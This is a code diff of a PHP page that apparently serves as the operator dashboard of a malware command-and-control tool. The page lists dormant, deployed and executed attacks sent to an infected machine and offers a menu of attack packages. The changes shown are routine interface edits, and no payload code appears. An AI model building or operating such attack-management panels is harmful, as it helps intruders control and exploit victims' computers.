@@ -26,8 +26,9 @@ use function Kelvinho\Virus\niceFileSize;
  * @param AttackFactory $attackFactory
  * @param User $user
  * @param PackageRegistrar $packageRegistrar
+ * @param string $virus_id
  */
-function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar) {
+function displayTable(array $attack_ids, array $visibleFields, AttackFactory $attackFactory, User $user, PackageRegistrar $packageRegistrar, string $virus_id) {
     if (count($attack_ids) === 0) { ?>
         <p>(No attacks)</p>
     <?php } else { ?>
@@ -38,20 +39,22 @@ function displayTable(array $attack_ids, array $visibleFields, AttackFactory $at
                     echo in_array(1, $visibleFields) ? "<th>Package</th>" : "";
                     echo in_array(2, $visibleFields) ? "<th>Hash/id</th>" : "";
                     echo in_array(3, $visibleFields) ? "<th>Executed time</th>" : "";
-                    echo in_array(4, $visibleFields) ? "<th>Usage</th>" : "";
+                    echo in_array(4, $visibleFields) ? "<th>Disk space</th>" : "";
                     echo in_array(5, $visibleFields) ? "<th></th>" : ""; ?>
                 </tr>
                 <?php foreach ($attack_ids as $attack_id) {
                     $attack = $attackFactory->get($attack_id);
                     $timezone = $user->getTimezone();
                     echo "<tr onclick = \"redirect('$attack_id')\" style=\"cursor: pointer;\">";
+                    //echo "<tr>";
+                    //echo "<a href='" . DOMAIN . "/ctrls/viewVirus?vrs=$virus_id&aks=$attack_id'>";
                     echo in_array(0, $visibleFields) ? "<td>" . $attack->getName() . "</td>" : "";
                     echo in_array(1, $visibleFields) ? "<td>" . $packageRegistrar->getDisplayName($attack->getPackageDbName()) . "</td>" : "";
                     echo in_array(2, $visibleFields) ? "<td>" . formattedHash($attack->getAttackId()) . "</td>" : "";
                     echo in_array(3, $visibleFields) ? "<td>" . formattedTime($attack->getExecutedTime() + Timezone::getUnixOffset($timezone)) . " UTC $timezone</td>" : "";
                     echo in_array(4, $visibleFields) ? "<td>" . niceFileSize($attack->usage()->getStatic()) . "</td>" : "";
                     echo in_array(5, $visibleFields) ? "<td class='w3-right-align'><button class=\"w3-btn w3-teal\" onclick=\"deleteAttack('" . $attack->getAttackId() . "')\">Delete</button></td>" : "";
-                    echo "</tr>";
+                    echo "</a></tr>";
                 } ?>
             </table>
         </div>
@@ -113,7 +116,8 @@ $user = $userFactory->get($session->get("user_handle")); ?>
     </style>
 </head>
 <body>
-<h1><a href="<?php echo DOMAIN . "/dashboard"; ?>">Virus info</a></h1>
+<?php HtmlTemplate::topNavigation($virus->getName(), $virus->getVirusId(), null, null, $user->isHold()); ?>
+<h1>Virus info</h1>
 <div class="w3-row">
     <div class="w3-col l4 m4 s6" style="padding-right: 8px;">
         <label for="name">Name</label>
@@ -137,6 +141,8 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <h1>Activity</h1>
 <div>
     <div id="dailyChartDiv">
+        <div style="position: absolute;width: 50%;height: 100%;left: 0;opacity: 0.2" class="w3-hover-grey" onclick="gotoPreviousDay()"></div>
+        <div style="position: absolute;width: 50%;height: 100%;left: 50%;opacity: 0.2" class="w3-hover-grey" onclick="gotoNextDay()"></div>
         <canvas id="dailyChart"></canvas>
     </div>
     <div id="monthlyChartDiv">
@@ -153,7 +159,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <br>
 <div class="w3-row">
     <!--suppress HtmlFormInputWithoutLabel -->
-    <select id="attackPackage" class="w3-select w3-col l10 m9 s8" name="option" style="padding: 10px;">
+    <select id="attackPackage" class="w3-select w3-col l10 m9 s8" name="option" style="padding: 8px;">
         <option value="" disabled selected>Choose attack package</option>
         <?php map($packageRegistrar->getPackages(), function ($package) use ($packageRegistrar) { ?>
             <option value="<?php echo "$package"; ?>"><?php echo $packageRegistrar->getDisplayName($package); ?></option>
@@ -170,21 +176,21 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 <div id="message" style="color: red;"></div>
 <h2>Background attacks</h2>
 <h3>Offline</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
 <h3>Online</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_BACKGROUND]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
 <h2>One time attacks</h2>
 <h3>Dormant attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DORMANT, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
 <h3>Deployed attacks</h3>
 <p>These are attacks that was sent to the virus, but the application hasn't heard a response from it yet. It could
     be that the virus hasn't noticed it yet, or it is executing and it's taking a long time. Or right when the virus
     is downloading the attacks, the internet is dropped and the payload doesn't get downloaded. If a payload stays
     here for more than an hour then this is likely the case. Then you can delete the attacks and start a new one all
     over again.</p>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_DEPLOYED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
 <h3>Executed attacks</h3>
-<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar); ?>
+<?php displayTable($virus->getAttacks(AttackBase::STATUS_EXECUTED, null, [AttackBase::TYPE_ONE_TIME, AttackBase::TYPE_SESSION]), [0, 1, 2, 3, 4, 5], $attackFactory, $user, $packageRegistrar, $virus->getVirusId()); ?>
 <h2>How to choose?</h2>
 <p>Oh hey, you're the new guy again. Don't know what attack packages to choose from? No worries, here is a quick
     guide.</p>
@@ -272,6 +278,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 </body>
 <?php HtmlTemplate::scripts(); ?>
 <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/chart.js@2.9.3/dist/Chart.min.js"></script>
+<!--suppress EqualityComparisonWithCoercionJS -->
 <script type="application/javascript">
     const gui = {
         packageDescriptions: $(".packageDescriptions"),
@@ -298,11 +305,7 @@ $user = $userFactory->get($session->get("user_handle")); ?>
 
     gui.packageDescriptions.css("display", "none");
 
-    const packageNames = {<?php echo join(", ", map($packageRegistrar->getPackages(), function ($dbName) use ($packageRegistrar) {
-            return "\"$dbName\": \"" . $packageRegistrar->getDisplayName($dbName) . "\"";
-        })) ?>};
-
-    gui.attackPackage.change(function() {
+    gui.attackPackage.change(function () {
         const packageDbName = gui.attackPackage.val();
         gui.packageDescriptions.css("display", "none");
         $("#packageDescription-" + packageDbName.replace(/\./g, "\\.")).css("display", "block");
@@ -353,21 +356,20 @@ $user = $userFactory->get($session->get("user_handle")); ?>
         });
     }
 
+    let ctrlIsPressed = false;
+    $(document).keydown(event => (event.which == "17" ? (ctrlIsPressed = true) : 0));
+    $(document).keyup(() => ctrlIsPressed = false);
+
     function redirect(attack_id) {
         if (clickHold) {
             clickHold = false;
             return;
         }
-        $.ajax({
-            url: "<?php echo DOMAIN_CONTROLLER; ?>/setAttackId",
-            type: "POST",
-            data: {
-                attack_id: attack_id,
-            },
-            success: function () {
-                window.location = "<?php echo DOMAIN . "/attack"; ?>"
-            }
-        });
+        if (ctrlIsPressed) {
+            window.open("<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id, "_blank");
+        } else {
+            window.location = "<?php echo DOMAIN . "/ctrls/viewAttack?vrs=$virus_id&aks="; ?>" + attack_id;
+        }
     }
 
     <?php
@@ -535,14 +537,6 @@ $user = $userFactory->get($session->get("user_handle")); ?>
                 xAxes: [{ticks: {autoSkip: false}}],
                 yAxes: [{scaleLabel: {display: true, labelString: '% Hour'}}]
             }
-        }
-    });
-
-    $("#dailyChart").click(function (event) {
-        if (event.offsetX > $("#dailyChart").width() / 2) {
-            gotoNextDay();
-        } else {
-            gotoPreviousDay();
         }
     });
 
